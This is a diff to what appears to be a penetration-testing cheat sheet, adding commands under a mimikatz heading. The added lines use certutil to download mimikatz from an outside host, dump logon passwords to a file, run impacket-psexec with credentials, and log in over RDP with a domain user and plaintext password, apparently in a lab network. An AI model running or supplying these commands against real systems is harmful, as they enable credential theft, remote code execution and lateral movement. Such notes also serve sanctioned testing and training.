@@ -198,9 +198,10 @@
 	- mimikatz
 		- Commands
 			- mimikatz.exe
-				- `privilege::debug`
-				- `sekurlsa::logonpasswords`
-
+				- `certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe`
+				- `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > hash.txt`
+				- `impacket-psexec username:password@IP`
+				- `xfreerdp /u:david /d:xor.com /p:dsfdf34534tdfGDFG5rdgr  /v:10.11.1.120`
 
 - Con invoke-mimikatz
 	- powershell
